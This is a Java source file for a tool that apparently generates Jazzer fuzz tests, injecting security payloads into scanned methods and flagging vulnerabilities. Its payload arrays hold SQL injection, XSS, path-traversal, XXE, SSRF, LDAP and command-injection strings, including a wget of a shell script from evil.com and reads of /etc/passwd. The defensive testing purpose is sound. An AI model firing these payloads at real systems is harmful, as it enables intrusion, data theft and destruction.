package generator;

import scanner.MethodInfo;
import java.io.File;
import java.io.FileWriter;
import java.util.ArrayList;
import java.util.List;

/**
 * Generates fuzz tests with COMPREHENSIVE SECURITY DETECTION
 * Now detects: SQL Injection, XSS, Path Traversal, Command Injection, 
 * XXE, SSRF, Hardcoded Credentials, Weak Crypto, Open Redirect, and more!
 */
public class SecurityAwareFuzzTestGenerator {

    public static List<String> generateSecurityTests(List<MethodInfo> methods) throws Exception {
        List<String> output = new ArrayList<>();
        
        int index = 0;
        for (MethodInfo mi : methods) {
            // Test ALL methods - not just "security-relevant" ones
            // Because vulnerabilities can hide anywhere!
            if (mi.paramTypes.size() <= 5) { // Reasonable parameter limit
                String className = "SecurityFuzz_" + String.format("%04d", index);
                String fullClassName = generateSingleSecurityTest(mi, className);
                output.add(fullClassName);
                index++;
            }
        }
        
        System.out.println("Generated " + output.size() + " comprehensive security fuzz tests");
        return output;
    }

    private static String generateSingleSecurityTest(MethodInfo mi, String className) throws Exception {
        File out = new File("src/test/java/fuzz/" + className + ".java");
        out.getParentFile().mkdirs();

        StringBuilder sb = new StringBuilder();
        sb.append("package fuzz;\n\n");
        sb.append("import com.code_intelligence.jazzer.api.*;\n");
        sb.append("import security.SecurityDetector;\n");
        sb.append("import security.SecurityDetector.SecurityIssue;\n");
        sb.append("import java.lang.reflect.*;\n");
        sb.append("import java.io.*;\n");
        sb.append("import java.util.*;\n\n");

        sb.append("/**\n");
        sb.append(" * Comprehensive security test for: ").append(mi.className).append(".").append(mi.methodName).append("\n");
        sb.append(" * Tests: SQL Injection, XSS, Path Traversal, Command Injection, XXE, SSRF, etc.\n");
        sb.append(" */\n");
        sb.append("public class ").append(className).append(" {\n\n");

        // EXPANDED Security payloads - nhiều loại hơn!
        sb.append("  // ========== SQL INJECTION PAYLOADS ==========\n");
        sb.append("  private static final String[] SQL_PAYLOADS = {\n");
        sb.append("    \"' OR '1'='1\",\n");
        sb.append("    \"'; DROP TABLE users--\",\n");
        sb.append("    \"1' AND 1=1--\",\n");
        sb.append("    \"admin'--\",\n");
        sb.append("    \"' UNION SELECT * FROM users--\",\n");
        sb.append("    \"1' ORDER BY 10--\",\n");
        sb.append("    \"' OR 1=1#\",\n");
        sb.append("    \"1'; WAITFOR DELAY '00:00:05'--\"\n");
        sb.append("  };\n\n");

        sb.append("  // ========== XSS PAYLOADS ==========\n");
        sb.append("  private static final String[] XSS_PAYLOADS = {\n");
        sb.append("    \"<script>alert('XSS')</script>\",\n");
        sb.append("    \"<img src=x onerror=alert('XSS')>\",\n");
        sb.append("    \"javascript:alert('XSS')\",\n");
        sb.append("    \"<iframe src='javascript:alert(1)'></iframe>\",\n");
        sb.append("    \"<svg onload=alert('XSS')>\",\n");
        sb.append("    \"<body onload=alert('XSS')>\",\n");
        sb.append("    \"'\\\"><script>alert(String.fromCharCode(88,83,83))</script>\"\n");
        sb.append("  };\n\n");

        sb.append("  // ========== PATH TRAVERSAL PAYLOADS ==========\n");
        sb.append("  private static final String[] PATH_PAYLOADS = {\n");
        sb.append("    \"../../../etc/passwd\",\n");
        sb.append("    \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n");
        sb.append("    \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n");
        sb.append("    \"....//....//....//etc/passwd\",\n");
        sb.append("    \"..%252f..%252f..%252fetc%252fpasswd\",\n");
        sb.append("    \"file:///etc/passwd\"\n");
        sb.append("  };\n\n");

        sb.append("  // ========== COMMAND INJECTION PAYLOADS ==========\n");
        sb.append("  private static final String[] CMD_PAYLOADS = {\n");
        sb.append("    \"; ls -la\",\n");
        sb.append("    \"| whoami\",\n");
        sb.append("    \"& dir\",\n");
        sb.append("    \"`cat /etc/passwd`\",\n");
        sb.append("    \"$(cat /etc/passwd)\",\n");
        sb.append("    \"; wget http://evil.com/shell.sh\",\n");
        sb.append("    \"|| cat /etc/passwd\"\n");
        sb.append("  };\n\n");

        sb.append("  // ========== XXE PAYLOADS ==========\n");
        sb.append("  private static final String[] XXE_PAYLOADS = {\n");
        sb.append("    \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><data>&xxe;</data>\",\n");
        sb.append("    \"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"http://evil.com/xxe\\\">]>\",\n");
        sb.append("    \"<!ENTITY xxe SYSTEM \\\"file:///c:/windows/win.ini\\\">\"\n");
        sb.append("  };\n\n");

        sb.append("  // ========== SSRF PAYLOADS ==========\n");
        sb.append("  private static final String[] SSRF_PAYLOADS = {\n");
        sb.append("    \"http://localhost:8080/admin\",\n");
        sb.append("    \"http://127.0.0.1:22\",\n");
        sb.append("    \"http://169.254.169.254/latest/meta-data/\",\n");
        sb.append("    \"http://192.168.1.1/admin\",\n");
        sb.append("    \"http://10.0.0.1/internal\",\n");
        sb.append("    \"file:///etc/passwd\"\n");
        sb.append("  };\n\n");

        sb.append("  // ========== LDAP INJECTION PAYLOADS ==========\n");
        sb.append("  private static final String[] LDAP_PAYLOADS = {\n");
        sb.append("    \"*)(uid=*))(|(uid=*\",\n");
        sb.append("    \"admin)(&(password=*))\",\n");
        sb.append("    \"*)(|(objectClass=*\"\n");
        sb.append("  };\n\n");

        sb.append("  // ========== OPEN REDIRECT PAYLOADS ==========\n");
        sb.append("  private static final String[] REDIRECT_PAYLOADS = {\n");
        sb.append("    \"http://evil.com\",\n");
        sb.append("    \"//evil.com\",\n");
        sb.append("    \"javascript:alert('XSS')\",\n");
        sb.append("    \"data:text/html,<script>alert('XSS')</script>\"\n");
        sb.append("  };\n\n");

        sb.append("  // ========== HARDCODED SECRETS PATTERNS ==========\n");
        sb.append("  private static final String[] SECRET_PATTERNS = {\n");
        sb.append("    \"password\",\n");
        sb.append("    \"secret\",\n");
        sb.append("    \"api_key\",\n");
        sb.append("    \"token\",\n");
        sb.append("    \"credential\"\n");
        sb.append("  };\n\n");

        // Output capture
        sb.append("  private static ByteArrayOutputStream capturedOutput;\n");
        sb.append("  private static PrintStream originalOut;\n");
        sb.append("  private static PrintStream originalErr;\n\n");

        // Fuzzing method
        sb.append("  public static void fuzzerTestOneInput(FuzzedDataProvider data) {\n");
        sb.append("    try {\n");
        
        // Chọn payload category
        sb.append("      // Choose payload category\n");
        sb.append("      int category = data.consumeInt(0, 7);\n");
        sb.append("      String payload;\n");
        sb.append("      String payloadType;\n");
        sb.append("      \n");
        sb.append("      switch (category) {\n");
        sb.append("        case 0:\n");
        sb.append("          payload = SQL_PAYLOADS[data.consumeInt(0, SQL_PAYLOADS.length - 1)];\n");
        sb.append("          payloadType = \"SQL_INJECTION\";\n");
        sb.append("          break;\n");
        sb.append("        case 1:\n");
        sb.append("          payload = XSS_PAYLOADS[data.consumeInt(0, XSS_PAYLOADS.length - 1)];\n");
        sb.append("          payloadType = \"XSS\";\n");
        sb.append("          break;\n");
        sb.append("        case 2:\n");
        sb.append("          payload = PATH_PAYLOADS[data.consumeInt(0, PATH_PAYLOADS.length - 1)];\n");
        sb.append("          payloadType = \"PATH_TRAVERSAL\";\n");
        sb.append("          break;\n");
        sb.append("        case 3:\n");
        sb.append("          payload = CMD_PAYLOADS[data.consumeInt(0, CMD_PAYLOADS.length - 1)];\n");
        sb.append("          payloadType = \"COMMAND_INJECTION\";\n");
        sb.append("          break;\n");
        sb.append("        case 4:\n");
        sb.append("          payload = XXE_PAYLOADS[data.consumeInt(0, XXE_PAYLOADS.length - 1)];\n");
        sb.append("          payloadType = \"XXE\";\n");
        sb.append("          break;\n");
        sb.append("        case 5:\n");
        sb.append("          payload = SSRF_PAYLOADS[data.consumeInt(0, SSRF_PAYLOADS.length - 1)];\n");
        sb.append("          payloadType = \"SSRF\";\n");
        sb.append("          break;\n");
        sb.append("        case 6:\n");
        sb.append("          payload = LDAP_PAYLOADS[data.consumeInt(0, LDAP_PAYLOADS.length - 1)];\n");
        sb.append("          payloadType = \"LDAP_INJECTION\";\n");
        sb.append("          break;\n");
        sb.append("        case 7:\n");
        sb.append("          payload = REDIRECT_PAYLOADS[data.consumeInt(0, REDIRECT_PAYLOADS.length - 1)];\n");
        sb.append("          payloadType = \"OPEN_REDIRECT\";\n");
        sb.append("          break;\n");
        sb.append("        default:\n");
        sb.append("          payload = data.consumeString(256);\n");
        sb.append("          payloadType = \"RANDOM\";\n");
        sb.append("      }\n\n");

        // Capture output
        sb.append("      // Capture ALL output\n");
        sb.append("      capturedOutput = new ByteArrayOutputStream();\n");
        sb.append("      originalOut = System.out;\n");
        sb.append("      originalErr = System.err;\n");
        sb.append("      System.setOut(new PrintStream(capturedOutput));\n");
        sb.append("      System.setErr(new PrintStream(capturedOutput));\n\n");

        // Load class and invoke method
        sb.append("      // Load target class\n");
        sb.append("      Class<?> cls = Class.forName(\"").append(mi.className).append("\");\n");
        sb.append("      Constructor<?> ctor = cls.getDeclaredConstructor();\n");
        sb.append("      ctor.setAccessible(true);\n");
        sb.append("      Object instance = ctor.newInstance();\n\n");

        // Prepare parameters
        sb.append("      // Prepare parameters with payload\n");
        sb.append("      Class<?>[] paramTypes = new Class<?>[] {");
        for (int i = 0; i < mi.paramTypes.size(); i++) {
            if (i > 0) sb.append(", ");
            sb.append(getClassLiteral(mi.paramTypes.get(i)));
        }
        sb.append("};\n\n");

        sb.append("      Object[] args = new Object[").append(mi.paramTypes.size()).append("];\n");
        for (int i = 0; i < mi.paramTypes.size(); i++) {
            String type = mi.paramTypes.get(i);
            if (type.equals("java.lang.String")) {
                sb.append("      args[").append(i).append("] = payload; // Inject payload here\n");
            } else if (type.equals("byte[]")) {
                sb.append("      args[").append(i).append("] = payload.getBytes();\n");
            } else {
                sb.append("      ").append(generateArgumentCode(i, type)).append("\n");
            }
        }

        // Invoke method
        sb.append("\n      // Invoke method\n");
        sb.append("      Method m = cls.getDeclaredMethod(\"").append(mi.methodName).append("\", paramTypes);\n");
        sb.append("      m.setAccessible(true);\n");
        sb.append("      Object result = m.invoke(instance, args);\n\n");

        // Restore output
        sb.append("      // Restore output\n");
        sb.append("      System.setOut(originalOut);\n");
        sb.append("      System.setErr(originalErr);\n");
        sb.append("      String output = capturedOutput.toString();\n\n");

        // COMPREHENSIVE Security detection
        sb.append("      // ========== COMPREHENSIVE SECURITY ANALYSIS ==========\n");
        sb.append("      List<SecurityIssue> issues = new ArrayList<>();\n\n");

        // SQL Injection detection
        sb.append("      // 1. SQL Injection Detection\n");
        sb.append("      if (output.toLowerCase().contains(\"select\") || \n");
        sb.append("          output.toLowerCase().contains(\"insert\") ||\n");
        sb.append("          output.toLowerCase().contains(\"update\") ||\n");
        sb.append("          output.toLowerCase().contains(\"delete\") ||\n");
        sb.append("          output.toLowerCase().contains(\"sql\")) {\n");
        sb.append("        SecurityIssue sql = SecurityDetector.detectSQLInjection(output, payload);\n");
        sb.append("        if (sql != null) issues.add(sql);\n");
        sb.append("      }\n\n");

        // XSS detection
        sb.append("      // 2. XSS Detection\n");
        sb.append("      if (output.contains(\"<\") && output.contains(\">\")) {\n");
        sb.append("        SecurityIssue xss = SecurityDetector.detectXSS(output, payload);\n");
        sb.append("        if (xss != null) issues.add(xss);\n");
        sb.append("      }\n\n");

        // Path Traversal detection
        sb.append("      // 3. Path Traversal Detection\n");
        sb.append("      if (output.contains(\"/\") || output.contains(\"\\\\\") || \n");
        sb.append("          output.toLowerCase().contains(\"file\") ||\n");
        sb.append("          output.toLowerCase().contains(\"path\")) {\n");
        sb.append("        SecurityIssue path = SecurityDetector.detectPathTraversal(output, payload);\n");
        sb.append("        if (path != null) issues.add(path);\n");
        sb.append("      }\n\n");

        // Command Injection detection
        sb.append("      // 4. Command Injection Detection\n");
        sb.append("      if (output.toLowerCase().contains(\"command\") ||\n");
        sb.append("          output.toLowerCase().contains(\"exec\") ||\n");
        sb.append("          output.toLowerCase().contains(\"process\")) {\n");
        sb.append("        SecurityIssue cmd = SecurityDetector.detectCommandInjection(output, payload);\n");
        sb.append("        if (cmd != null) issues.add(cmd);\n");
        sb.append("      }\n\n");

        // XXE detection
        sb.append("      // 5. XXE Detection\n");
        sb.append("      if (payloadType.equals(\"XXE\") && output.length() > 0) {\n");
        sb.append("        SecurityIssue xxe = SecurityDetector.detectXXE(payload);\n");
        sb.append("        if (xxe != null) issues.add(xxe);\n");
        sb.append("      }\n\n");

        // SSRF detection
        sb.append("      // 6. SSRF Detection\n");
        sb.append("      if (payloadType.equals(\"SSRF\") || \n");
        sb.append("          output.toLowerCase().contains(\"http\") ||\n");
        sb.append("          output.toLowerCase().contains(\"url\")) {\n");
        sb.append("        SecurityIssue ssrf = SecurityDetector.detectSSRF(payload);\n");
        sb.append("        if (ssrf != null) issues.add(ssrf);\n");
        sb.append("      }\n\n");

        // Hardcoded credentials detection
        sb.append("      // 7. Hardcoded Credentials Detection\n");
        sb.append("      for (String pattern : SECRET_PATTERNS) {\n");
        sb.append("        if (output.toLowerCase().contains(pattern) && \n");
        sb.append("            output.contains(\"=\")) {\n");
        sb.append("          issues.add(new SecurityIssue(\n");
        sb.append("            \"Hardcoded Credentials\",\n");
        sb.append("            \"HIGH\",\n");
        sb.append("            \"Sensitive data exposed in output\",\n");
        sb.append("            \"Pattern: \" + pattern + \"\\nOutput: \" + output.substring(0, Math.min(200, output.length())),\n");
        sb.append("            \"Use environment variables or secure vault\"\n");
        sb.append("          ));\n");
        sb.append("          break;\n");
        sb.append("        }\n");
        sb.append("      }\n\n");

        // Insecure deserialization detection
        sb.append("      // 8. Insecure Deserialization Detection\n");
        sb.append("      if (args.length > 0 && args[0] instanceof byte[]) {\n");
        sb.append("        SecurityIssue deser = SecurityDetector.detectInsecureDeserialization((byte[])args[0]);\n");
        sb.append("        if (deser != null) issues.add(deser);\n");
        sb.append("      }\n\n");

        // Stack trace exposure detection
        sb.append("      // 9. Information Disclosure Detection\n");
        sb.append("      if (output.contains(\"Exception\") || \n");
        sb.append("          output.contains(\"at java.\") ||\n");
        sb.append("          output.contains(\"Caused by\")) {\n");
        sb.append("        issues.add(new SecurityIssue(\n");
        sb.append("          \"Information Disclosure\",\n");
        sb.append("          \"MEDIUM\",\n");
        sb.append("          \"Stack trace exposed to output\",\n");
        sb.append("          \"Stack trace may reveal sensitive information\",\n");
        sb.append("          \"Log errors internally, show generic message to users\"\n");
        sb.append("        ));\n");
        sb.append("      }\n\n");

        // Report issues with detailed info
        sb.append("      // Report all found issues\n");
        sb.append("      if (!issues.isEmpty()) {\n");
        sb.append("        System.err.println(\"\\n╔════════════════════════════════════════════════════════╗\");\n");
        sb.append("        System.err.println(\"║  🚨 SECURITY VULNERABILITY DETECTED!                   ║\");\n");
        sb.append("        System.err.println(\"╚════════════════════════════════════════════════════════╝\");\n");
        sb.append("        System.err.println(\"Method: ").append(mi.className).append(".").append(mi.methodName).append("\");\n");
        sb.append("        System.err.println(\"Payload Type: \" + payloadType);\n");
        sb.append("        System.err.println(\"Payload: \" + payload);\n");
        sb.append("        System.err.println(\"\\nVulnerabilities Found: \" + issues.size());\n");
        sb.append("        System.err.println(\"════════════════════════════════════════════════════════\");\n");
        sb.append("        \n");
        sb.append("        for (int i = 0; i < issues.size(); i++) {\n");
        sb.append("          SecurityIssue issue = issues.get(i);\n");
        sb.append("          System.err.println(\"\\n[\" + (i+1) + \"] \" + issue);\n");
        sb.append("        }\n");
        sb.append("        \n");
        sb.append("        System.err.println(\"\\n════════════════════════════════════════════════════════\\n\");\n");
        sb.append("        \n");
        sb.append("        // Throw to create crash file\n");
        sb.append("        throw new SecurityException(\"Security vulnerabilities detected: \" + \n");
        sb.append("          issues.stream().map(i -> i.type).collect(java.util.stream.Collectors.joining(\", \")));\n");
        sb.append("      }\n\n");

        // Exception handling
        sb.append("    } catch (InvocationTargetException ite) {\n");
        sb.append("      Throwable cause = ite.getCause();\n");
        sb.append("      if (cause instanceof SecurityException) {\n");
        sb.append("        throw (SecurityException) cause;\n");
        sb.append("      }\n");
        sb.append("      // Ignore other exceptions\n");
        sb.append("    } catch (SecurityException se) {\n");
        sb.append("      throw se;\n");
        sb.append("    } catch (Throwable t) {\n");
        sb.append("      // Ignore reflection/other errors\n");
        sb.append("    } finally {\n");
        sb.append("      if (originalOut != null) System.setOut(originalOut);\n");
        sb.append("      if (originalErr != null) System.setErr(originalErr);\n");
        sb.append("    }\n");
        sb.append("  }\n");
        sb.append("}\n");

        try (FileWriter fw = new FileWriter(out)) {
            fw.write(sb.toString());
        }

        return "fuzz." + className;
    }

    private static String getClassLiteral(String type) {
        switch (type) {
            case "int": return "int.class";
            case "long": return "long.class";
            case "double": return "double.class";
            case "float": return "float.class";
            case "boolean": return "boolean.class";
            case "byte": return "byte.class";
            case "short": return "short.class";
            case "char": return "char.class";
            case "java.lang.String": return "String.class";
            case "byte[]": return "byte[].class";
            default: return type + ".class";
        }
    }

    private static String generateArgumentCode(int index, String type) {
        switch (type) {
            case "int": return "args[" + index + "] = 0;";
            case "long": return "args[" + index + "] = 0L;";
            case "double": return "args[" + index + "] = 0.0;";
            case "float": return "args[" + index + "] = 0.0f;";
            case "boolean": return "args[" + index + "] = false;";
            case "byte": return "args[" + index + "] = (byte)0;";
            case "short": return "args[" + index + "] = (short)0;";
            case "char": return "args[" + index + "] = 'a';";
            default: return "args[" + index + "] = null;";
        }
    }
}